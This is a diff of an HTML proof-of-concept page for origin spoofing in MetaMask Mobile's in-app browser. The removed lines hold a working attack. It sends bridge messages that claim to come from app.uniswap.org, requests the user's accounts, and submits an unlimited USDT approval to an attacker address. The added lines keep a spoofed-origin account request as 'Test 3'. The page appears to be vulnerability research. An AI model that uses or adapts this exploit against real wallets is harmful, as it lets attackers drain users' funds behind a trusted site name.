@@ -1,54 +1,107 @@
-  <html>
-  <head>
-      <title>MetaMask Origin Spoof PoC</title>
-  </head>
-  <body>
-      <h3>MetaMask Mobile Origin Spoofing PoC</h3>
-      <button onclick="exploit()">Trigger Exploit</button>
-      <pre id="log"></pre>
+<!DOCTYPE html>
+<html>
+<head>
+    <title>MetaMask Origin Spoof Test</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+</head>
+<body>
+    <h3>MetaMask Origin Spoof Test</h3>
+    <div id="status"></div>
+    <button onclick="testInpage()">Test 1: Use window.ethereum</button><br><br>
+    <button onclick="testRNWebView()">Test 2: Use ReactNativeWebView</button><br><br>
+    <button onclick="testSpoofedOrigin()">Test 3: Spoofed Origin</button><br><br>
+    <pre id="log" style="background:#f0f0f0;padding:10px;font-size:12px;"></pre>
 
-      <script>
-          const SPOOFED_ORIGIN = 'https://app.uniswap.org';
-          const ATTACKER = '0x1234567890123456789012345678901234567890';
+    <script>
+        function log(msg) {
+            const el = document.getElementById('log');
+            el.textContent += new Date().toISOString().slice(11,19) + ' ' + msg + '\n';
+            console.log(msg);
+        }
 
-          function log(msg) {
-              document.getElementById('log').textContent += msg + '\n';
-              console.log(msg);
-          }
+        // Check environment
+        window.onload = function() {
+            log('=== Environment Check ===');
+            log('window.ethereum: ' + (typeof window.ethereum !== 'undefined'));
+            log('window.ReactNativeWebView: ' + (typeof window.ReactNativeWebView !== 'undefined'));
+            log('User Agent: ' + navigator.userAgent.slice(0, 50) + '...');
 
-          function exploit() {
-              if (!window.ReactNativeWebView) {
-                  log('ERROR: Not in MetaMask Mobile browser');
-                  return;
-              }
+            if (window.ReactNativeWebView) {
+                document.getElementById('status').innerHTML = '<b style="color:green">ReactNativeWebView detected</b>';
+            } else if (window.ethereum) {
+                document.getElementById('status').innerHTML = '<b style="color:orange">Only window.ethereum detected</b>';
+            } else {
+                document.getElementById('status').innerHTML = '<b style="color:red">Not in MetaMask browser</b>';
+            }
+        };
 
-              // Get accounts with spoofed origin
-              window.ReactNativeWebView.postMessage(JSON.stringify({
-                  name: 'metamask-provider',
-                  origin: SPOOFED_ORIGIN,
-                  data: { jsonrpc: '2.0', id: 1, method: 'eth_requestAccounts', params: [] }
-              }));
-              log('Sent spoofed eth_requestAccounts');
+        // Listen for responses
+        window.addEventListener('message', function(e) {
+            log('message event: ' + JSON.stringify(e.data).slice(0, 200));
+        });
 
-              // Malicious approval (USDT unlimited approve to attacker)
-              setTimeout(() => {
-                  window.ReactNativeWebView.postMessage(JSON.stringify({
-                      name: 'metamask-provider',
-                      origin: SPOOFED_ORIGIN,
-                      data: {
-                          jsonrpc: '2.0',
-                          id: 2,
-                          method: 'eth_sendTransaction',
-                          params: [{
-                              to: '0xdAC17F958D2ee523a2206206994597C13D831ec7',
-                              data: '0x095ea7b3000000000000000000000000' + ATTACKER.slice(2) + 'ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff'
-                          }]
-                      }
-                  }));
-                  log('Sent spoofed unlimited USDT approval');
-                  log('UI will show request from: ' + SPOOFED_ORIGIN);
-              }, 1000);
-          }
-      </script>
-  </body>
-  </html>
+        // Test 1: Normal ethereum provider
+        async function testInpage() {
+            log('=== Test 1: window.ethereum ===');
+            if (!window.ethereum) {
+                log('ERROR: window.ethereum not found');
+                return;
+            }
+            try {
+                const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
+                log('Accounts: ' + JSON.stringify(accounts));
+            } catch (e) {
+                log('Error: ' + e.message);
+            }
+        }
+
+        // Test 2: Direct ReactNativeWebView
+        function testRNWebView() {
+            log('=== Test 2: ReactNativeWebView ===');
+            if (!window.ReactNativeWebView) {
+                log('ERROR: ReactNativeWebView not found');
+                return;
+            }
+
+            const msg = {
+                name: 'metamask-provider',
+                origin: window.location.href,
+                data: {
+                    jsonrpc: '2.0',
+                    id: Date.now(),
+                    method: 'eth_requestAccounts',
+                    params: []
+                }
+            };
+            log('Sending: ' + JSON.stringify(msg));
+            window.ReactNativeWebView.postMessage(JSON.stringify(msg));
+            log('Sent!');
+        }
+
+        // Test 3: Spoofed origin
+        function testSpoofedOrigin() {
+            log('=== Test 3: Spoofed Origin ===');
+            if (!window.ReactNativeWebView) {
+                log('ERROR: ReactNativeWebView not found');
+                return;
+            }
+
+            const spoofed = 'https://app.uniswap.org';
+            const msg = {
+                name: 'metamask-provider',
+                origin: spoofed,
+                data: {
+                    jsonrpc: '2.0',
+                    id: Date.now(),
+                    method: 'eth_requestAccounts',
+                    params: []
+                }
+            };
+            log('Sending with spoofed origin: ' + spoofed);
+            log('Payload: ' + JSON.stringify(msg));
+            window.ReactNativeWebView.postMessage(JSON.stringify(msg));
+            log('Sent!');
+        }
+    </script>
+</body>
+</html>
